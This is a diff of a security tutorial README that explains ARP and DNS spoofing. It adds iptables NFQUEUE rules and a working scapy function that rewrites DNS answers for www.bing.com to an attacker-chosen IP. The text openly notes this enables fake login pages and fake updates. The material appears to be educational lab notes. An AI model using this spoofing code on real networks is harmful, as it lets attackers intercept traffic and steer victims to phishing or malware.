@@ -45,6 +45,7 @@ Expected response:
 ### Command to run the network_scanner script:
 
  **/24 Allowed to go through all the range from 0 to 254**
+
 ```sh
 python  network_scanner.py --target {OUR_IP}/24
 ```
@@ -90,7 +91,7 @@ Expected response:
 
 ### Concepts related to the project.
 
- - [#arp] ARP (Address Resolution Protocol): Is in charge of help in finding the MAC address of a device within a local network.
+ - [^arp] ARP (Address Resolution Protocol): Is in charge of help in finding the MAC address of a device within a local network.
 
  - MAC: Unique hardware addresses assigned to network interface cards. It is used for actual data transmission at the hardware level
 
@@ -103,7 +104,7 @@ Expected response:
  - ARP table: It is also known as an ARP cache, is a table maintained by network devices, such as computers and routers, to store a mapping between IP addresses
    and corresponding MAC addresses within a local network.
 
- ## How [ARP](#arp) Works?
+ ## How [ARP](^arp) Works?
 
 1. **Device A Wants to Communicate with Device B:**
    - Device A needs to send data to Device B but only knows its IP address, not the MAC address.
@@ -127,7 +128,7 @@ Expected response:
 *** ADD A TYPICAL NETWORK IMAGE HERE ***
 
 
-## How [ARP](#arp) spoofing Works:
+## How [ARP](^arp) spoofing Works:
 
 Let's imagine a scenario with three devices: Device A (attacker), Device B (victim), and Device R (router).
 
@@ -250,21 +251,29 @@ to a queue.
     iptables -I FORDWARD -J NFQUEUE --queue-num 125
 ```
 
-1.b Create local testing environment.
+[^1]: 1.b Create local testing environment.
 
 They only go into the "FORDWARD" chain if they're coming from a different computer so in order to test our script locally we have to first create a queue for
 the the "OUTPUT" chain, this is the chain where packets leaving my computer go through, that's the one I want to trap its packets. So the only thing that's
 going to differ when testing on a local machine or against a remote machine with ARP spoofing is the IP tables rules.
 
 ```sh
-    iptables -I OUTPUT -J NFQUEUE --queue-num 369
+    iptables -I OUTPUT -j NFQUEUE --queue-num 357
 ```
 
 Second we have to create a queue for the the "INPUT" chain, this is the chain packets coming to my computer.
 
 ```sh
-    iptables -I INPUT -J NFQUEUE --queue-num 357
+    iptables -I INPUT -j NFQUEUE --queue-num 357
 ```
+
+Once we finish is important to run the command below to set the tables as they were:
+
+```sh
+    iptables --flush
+```
+
+**Remember use the same --queue-num in the queue.bind statement in the script**
 
 So right now what we did is we created the queue and you can think of what's going to happen now if
 we are the man in the middle and your requests that we're going to get or responses will be trapped
@@ -273,7 +282,7 @@ in a queue like this one.
 Now we have to install a module as usual:
 
 ```sh
-    pip instal netfilterqueue
+    pip install netfilterqueue
 ```
 
 When we finish with the attack we have to make sure we delete the IP table we create at the beginning
@@ -301,6 +310,75 @@ a number of ways to serve the IP of the hacker's web server, which is 0 to 16.
 And instead of the IP of Booking.com, this is very dangerous because we'll be able to hijack and spoof any DNS request made
 by the user and serve the user. Fake websites, fake login pages, fake updates, and so on.
 
+How a DNS response looks like?
+
+Lets generate a DNS to see what we got:
+
+The line below in our dns_spoof script specify what layer we want to see (scapy.DNSRR)
+
+```python
+    if scapy_packet.haslayer(scapy.DNSRR):
+```
+We have to have our input and output packets redirect to my computer to the queue that's in our code. As is explain here locally [^1].
+And then we can run, in terminal, the command below to generate the request:
+
+```python
+    ping -c 1 www.bing.com
+```
+
+We should received the response below:
+
+![ping expected response](img/ping_expected_response.png)
+
+And if we run our *process_packet* method as below:
+
+```python
+    def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.DNSRR):
+        print(scapy_packet.show())
+    packet.accept()
+```
+
+Whe should be able to see the print, among other things, of the response as shown below. The main answer that we'd be interested
+in is the "qtype = A" record, that's the one that converts domain names to IP:
+
+![DNS response record](img/DNS_response_record.png)
+
+ We'll see the answer in here and you can see the our data field is the field that contains the IP, which is the same IP
+that we received when we pinged bing.com ("rdata = 13.107.21.200"), that is the one we want to modify first. Look for "\an"
+as in answer:
+
+![DNS layer to modify](img/DNS_layer_to_modify.png)
 
 3. Modify packets before forwarding them to their destination.
 
+Some response fields introduction:
+
+- len: layer corresponds to the length of or the size of the layer.
+
+- chksum (checksum): It's used to make sure that the packet has not been modified.
+
+```python
+    def process_packet(packet):
+        scapy_packet = scapy.IP(packet.get_payload()) # packet.get_payload() will get us a string of the data inside this packet, but we would't be able to access the layers nicely
+        if scapy_packet.haslayer(scapy.DNSRR): # DNSRR stand for DNS Resource Record which is the name we'll see in the response
+            qname = scapy_packet[scapy.DNSQR].qname # Where the domain's name inside the layer is set
+            if "www.bing.com" in qname:
+                print("[+] Spoofing target")
+                                    # rrname:website that the user requested, rdate: the IP returned as the IP of the requested domain
+                answer = scapy.DNSRR(rrname=qname, rdata="Ip_to_redirect_target") # Creating DNS response, we only need the field scapy can not set by itself
+                scapy_packet[scapy.DNS].an = answer # Set the "\an" field to the modify answer
+                scapy_packet[scapy.DNS].ancount = 1 # Set the field ancount to the amount of answer we are going to send
+
+                # Remove them from our packet and then when we send them, Skippy will automatically recalculate them based on the values that we modified.
+                # so the file don't get corrupted by our modify answer
+                del scapy_packet[scapy.IP].len
+                del scapy_packet[scapy.IP].chksum
+                del scapy_packet[scapy.UDP].len
+                del scapy_packet[scapy.UDP].chksum
+
+                # set the payload, on its the original format 'str', and send the packet we want to be forwarder (.accept())
+                packet.set_payload(str(scapy_packet))
+        packet.accept()
+```
